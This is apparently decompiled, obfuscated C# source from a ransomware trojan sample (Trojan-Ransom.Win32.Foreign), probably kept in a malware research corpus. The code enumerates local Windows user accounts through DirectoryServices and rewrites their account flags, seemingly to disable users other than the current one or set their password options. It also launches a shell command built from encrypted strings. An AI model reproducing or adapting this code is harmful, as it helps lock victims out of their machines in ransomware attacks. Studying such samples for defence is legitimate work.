// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=ed61553e989492b3
// MVID: C7CC9454-F663-4E88-B488-D89A8E8A2020
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Foreign.dee-7b2f429bcd0936ae802edc4bf60d2431ff2f87ffc6d1c3c3879ec6651f92b519.exe

using \u0003;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Runtime.InteropServices;

namespace \u0003
{
  internal class \u0006
  {
    private static string \u0001;
    private static string \u0002;
    private static string \u0003;
    private static string \u0004;
    private static List<string> \u0001;
    private static string \u0005;
    [NonSerialized]
    internal static \u0007 \u0016;

    static \u0006()
    {
      if (false)
        return;
      \u0008.\u0001(typeof (\u0006));
      \u0006.\u0001 = \u0006.\u0016(2381);
      \u0006.\u0002 = \u0006.\u0016(2394);
      \u0006.\u0003 = \u0006.\u0016(2403);
      do
      {
        \u0006.\u0004 = \u0006.\u0016(2448);
      }
      while (false);
      \u0006.\u0001 = \u0006.\u0001(\u007F.\u0082\u0002());
      \u0006.\u0005 = \u007F.\u0083\u0002();
    }

    public static void \u0001([In] string obj0, [In] string obj1)
    {
      int num = \u0006\u0002.\u001A\u0003(\u0084\u0002.\u0094\u0003(\u0006.\u0016(2493), obj0, \u0006.\u0016(2506), obj1), AppWinStyle.MinimizedFocus, false, -1);
    }

    public static void \u0001()
    {
label_0:
      List<string>.Enumerator enumerator;
      try
      {
        enumerator = \u0006.\u0001.GetEnumerator();
        while (enumerator.MoveNext())
        {
          if (true)
          {
            string current;
            if (true)
            {
              current = enumerator.Current;
              if (\u0014.\u0013\u0002(current, \u0006.\u0005, false) == 0)
                continue;
            }
            \u0006.\u0001(current, false);
          }
          else
            goto label_0;
        }
      }
      finally
      {
        if (true)
          enumerator.Dispose();
      }
    }

    public static unsafe string \u0001([In] string obj0, [In] bool obj1)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(20);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num;
      DirectoryEntry directoryEntry1 = \u0006.\u0001();
      string str = \u0006.\u0002;
      if (directoryEntry1 != null)
        goto label_9;
label_6:
      \u0012.\u007E\u0004\u0002((object) directoryEntry1);
      \u0012.\u007E\u009D((object) directoryEntry1);
      return str;
label_9:
      if (\u0006.\u0001(obj0))
      {
        try
        {
          DirectoryEntry directoryEntry2 = \u0087\u0002.\u007E\u0096\u0003((object) \u0086\u0002.\u007E\u0095\u0003((object) directoryEntry1), obj0, \u0006.\u0016(2511));
          *(int*) ((IntPtr) voidPtr + 4) = 512;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4);
          *(int*) ((IntPtr) voidPtr + 8) = 64;
          *(int*) voidPtr = 65536;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4) | *(int*) voidPtr | *(int*) ((IntPtr) voidPtr + 8);
          if (!obj1)
          {
            *(int*) ((IntPtr) voidPtr + 16) = 2;
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) | *(int*) ((IntPtr) voidPtr + 16);
          }
          object obj = \u0088\u0002.\u007E\u0097\u0003((object) directoryEntry2, \u0006.\u0016(2520), new object[2]
          {
            (object) \u0006.\u0016(2525),
            (object) *(int*) ((IntPtr) voidPtr + 12)
          });
          \u0012.\u007E\u0003\u0002((object) directoryEntry2);
          str = \u0006.\u0001;
          \u0012.\u007E\u0004\u0002((object) directoryEntry2);
          \u0012.\u007E\u009D((object) directoryEntry2);
          goto label_6;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
          str = \u0010.\u007E\u0097((object) exception);
          \u001C.\u001C\u0002();
          goto label_6;
        }
      }
      else
      {
        str = \u0006.\u0003;
        goto label_6;
      }
    }

    private static bool \u0001([In] string obj0)
    {
      DirectoryEntry directoryEntry1 = \u0006.\u0001();
      if (true)
        goto label_9;
label_1:
      int num = 0;
      if (num != 0)
        return num != 0;
      bool flag = num != 0;
      DirectoryEntry directoryEntry2;
      do
      {
        if (directoryEntry2 != null)
        {
          try
          {
            if (\u0087\u0002.\u007E\u0096\u0003((object) \u0086\u0002.\u007E\u0095\u0003((object) directoryEntry2), obj0, \u0006.\u0016(2511)) != null)
              flag = true;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            flag = false;
            if (true)
              \u001C.\u001C\u0002();
          }
        }
        \u0012.\u007E\u0004\u0002((object) directoryEntry2);
        \u0012.\u007E\u009D((object) directoryEntry2);
      }
      while (false);
      return flag;
label_9:
      directoryEntry2 = directoryEntry1;
      goto label_1;
    }

    private static DirectoryEntry \u0001()
    {
      DirectoryEntry directoryEntry;
      try
      {
        directoryEntry = new DirectoryEntry(\u007F\u0002.\u008F\u0003(\u0006.\u0016(2538), \u007F.\u0082\u0002(), \u0006.\u0016(2551)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          directoryEntry = (DirectoryEntry) null;
          \u001C.\u001C\u0002();
        }
        while (false);
      }
      return directoryEntry;
    }

    public static List<string> \u0001([In] string obj0)
    {
      List<string> stringList;
      if (true)
      {
        DirectoryEntry directoryEntry = new DirectoryEntry(\u0006.\u0016(2538) + obj0);
        stringList = new List<string>();
        IEnumerator enumerator;
        try
        {
          enumerator = directoryEntry.Children.GetEnumerator();
          while (true)
          {
            DirectoryEntry current;
            while (true)
            {
              if (enumerator.MoveNext())
                current = (DirectoryEntry) enumerator.Current;
              else
                goto label_8;
label_4:
              if (Operators.CompareString(current.SchemaClassName, \u0006.\u0016(2564), false) != 0)
                continue;
              break;
label_8:
              if (false)
                goto label_4;
              else
                goto label_13;
            }
            stringList.Add(current.Name);
          }
        }
        finally
        {
          while (enumerator is IDisposable)
          {
            if (true)
            {
              (enumerator as IDisposable).Dispose();
              break;
            }
          }
        }
      }
label_13:
      return stringList;
    }
  }
}
